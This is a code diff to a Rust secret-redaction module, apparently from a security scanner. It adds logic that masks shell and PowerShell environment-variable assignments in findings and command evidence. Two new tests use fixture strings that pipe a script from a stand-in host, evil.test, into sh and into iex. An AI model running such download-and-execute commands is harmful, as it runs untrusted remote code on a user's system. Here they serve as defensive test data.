@@ -94,6 +94,64 @@ pub fn redact_with_compiled(input: &str, compiled: &CompiledCustomPatterns) -> S
     result
 }
 
+/// Redact shell-style assignment values such as `KEY=value` before user content
+/// is serialized into logs or JSON output.
+pub fn redact_shell_assignments(input: &str) -> String {
+    let chars: Vec<char> = input.chars().collect();
+    let mut out = String::with_capacity(input.len());
+    let mut i = 0;
+
+    while i < chars.len() {
+        if let Some((prefix, next)) = redact_powershell_env_assignment(&chars, i) {
+            out.push_str(&prefix);
+            out.push_str("[REDACTED]");
+            i = next;
+            continue;
+        }
+
+        if is_assignment_start(&chars, i) {
+            let name_start = i;
+            i += 1;
+            while i < chars.len() && (chars[i].is_ascii_alphanumeric() || chars[i] == '_') {
+                i += 1;
+            }
+            if i < chars.len() && chars[i] == '=' {
+                let name: String = chars[name_start..i].iter().collect();
+                out.push_str(&name);
+                out.push_str("=[REDACTED]");
+                i += 1;
+                i = skip_assignment_value(&chars, i);
+                continue;
+            }
+            out.push(chars[name_start]);
+            i = name_start + 1;
+            continue;
+        }
+
+        out.push(chars[i]);
+        i += 1;
+    }
+
+    out
+}
+
+/// Redact a command-like string for public output by scrubbing assignment values
+/// first, then applying built-in and custom DLP patterns.
+pub fn redact_command_text(input: &str, custom_patterns: &[String]) -> String {
+    let scrubbed = redact_shell_assignments(input);
+    redact_with_custom(&scrubbed, custom_patterns)
+}
+
+/// Return a redacted clone of the provided findings for public-facing output.
+pub fn redacted_findings(
+    findings: &[crate::verdict::Finding],
+    custom_patterns: &[String],
+) -> Vec<crate::verdict::Finding> {
+    let mut redacted = findings.to_vec();
+    redact_findings(&mut redacted, custom_patterns);
+    redacted
+}
+
 /// Redact sensitive content from a Finding's string fields in-place.
 pub fn redact_finding(finding: &mut crate::verdict::Finding, custom_patterns: &[String]) {
     finding.title = redact_with_custom(&finding.title, custom_patterns);
@@ -116,13 +174,13 @@ fn redact_evidence(ev: &mut crate::verdict::Evidence, custom_patterns: &[String]
             *raw = redact_with_custom(raw, custom_patterns);
         }
         Evidence::CommandPattern { matched, .. } => {
-            *matched = redact_with_custom(matched, custom_patterns);
+            *matched = redact_command_text(matched, custom_patterns);
         }
         Evidence::EnvVar { value_preview, .. } => {
             *value_preview = redact_with_custom(value_preview, custom_patterns);
         }
         Evidence::Text { detail } => {
-            *detail = redact_with_custom(detail, custom_patterns);
+            *detail = redact_command_text(detail, custom_patterns);
         }
         Evidence::ByteSequence { description, .. } => {
             *description = redact_with_custom(description, custom_patterns);
@@ -144,6 +202,102 @@ pub fn redact_findings(findings: &mut [crate::verdict::Finding], custom_patterns
     for f in findings.iter_mut() {
         redact_finding(f, custom_patterns);
     }
+}
+
+fn is_assignment_boundary(prev: char) -> bool {
+    prev.is_ascii_whitespace() || matches!(prev, ';' | '|' | '&' | '(' | '\n')
+}
+
+fn is_assignment_start(chars: &[char], idx: usize) -> bool {
+    let ch = chars[idx];
+    if !(ch.is_ascii_alphabetic() || ch == '_') {
+        return false;
+    }
+    if idx > 0 && !is_assignment_boundary(chars[idx - 1]) {
+        return false;
+    }
+    true
+}
+
+fn skip_assignment_value(chars: &[char], mut idx: usize) -> usize {
+    let mut in_single = false;
+    let mut in_double = false;
+    let mut escaped = false;
+
+    while idx < chars.len() {
+        let ch = chars[idx];
+        if escaped {
+            escaped = false;
+            idx += 1;
+            continue;
+        }
+        if !in_single && ch == '\\' {
+            escaped = true;
+            idx += 1;
+            continue;
+        }
+        if !in_double && ch == '\'' {
+            in_single = !in_single;
+            idx += 1;
+            continue;
+        }
+        if !in_single && ch == '"' {
+            in_double = !in_double;
+            idx += 1;
+            continue;
+        }
+        if !in_single
+            && !in_double
+            && (ch.is_ascii_whitespace() || matches!(ch, ';' | '|' | '&' | '\n'))
+        {
+            break;
+        }
+        idx += 1;
+    }
+
+    idx
+}
+
+fn redact_powershell_env_assignment(chars: &[char], idx: usize) -> Option<(String, usize)> {
+    if idx > 0 && !is_assignment_boundary(chars[idx - 1]) {
+        return None;
+    }
+    if chars.get(idx) != Some(&'$') {
+        return None;
+    }
+    let prefix = ['e', 'n', 'v', ':'];
+    for (offset, expected) in prefix.iter().enumerate() {
+        let ch = chars.get(idx + 1 + offset)?;
+        if !ch.eq_ignore_ascii_case(expected) {
+            return None;
+        }
+    }
+
+    let name_start = idx + 5;
+    let first = *chars.get(name_start)?;
+    if !(first.is_ascii_alphabetic() || first == '_') {
+        return None;
+    }
+
+    let mut i = name_start + 1;
+    while i < chars.len() && (chars[i].is_ascii_alphanumeric() || chars[i] == '_') {
+        i += 1;
+    }
+    let mut value_start = i;
+    while value_start < chars.len() && chars[value_start].is_ascii_whitespace() {
+        value_start += 1;
+    }
+    if chars.get(value_start) != Some(&'=') {
+        return None;
+    }
+    value_start += 1;
+    while value_start < chars.len() && chars[value_start].is_ascii_whitespace() {
+        value_start += 1;
+    }
+
+    let prefix_text: String = chars[idx..value_start].iter().collect();
+    let value_end = skip_assignment_value(chars, value_start);
+    Some((prefix_text, value_end))
 }
 
 #[cfg(test)]
@@ -255,7 +409,8 @@ mod tests {
         }
         match &finding.evidence[2] {
             Evidence::CommandPattern { matched, .. } => {
-                assert!(matched.contains("[REDACTED:OpenAI API Key]"));
+                assert!(matched.contains("OPENAI_API_KEY=[REDACTED]"));
+                assert!(!matched.contains("sk-abcdef"));
             }
             _ => panic!("expected CommandPattern"),
         }
@@ -271,5 +426,22 @@ mod tests {
             .as_ref()
             .unwrap()
             .contains("[REDACTED:AWS Access Key]"));
+    }
+
+    #[test]
+    fn test_redact_shell_assignments_scrubs_short_secret_assignments() {
+        let redacted =
+            redact_shell_assignments("OPENAI_API_KEY=sk-secret curl https://evil.test | sh");
+        assert!(redacted.contains("OPENAI_API_KEY=[REDACTED]"));
+        assert!(!redacted.contains("sk-secret"));
+    }
+
+    #[test]
+    fn test_redact_shell_assignments_scrubs_powershell_env_assignments() {
+        let redacted = redact_shell_assignments(
+            "$env:OPENAI_API_KEY = 'sk-secret'; iwr https://evil.test | iex",
+        );
+        assert!(redacted.contains("$env:OPENAI_API_KEY = [REDACTED]"));
+        assert!(!redacted.contains("sk-secret"));
     }
 }
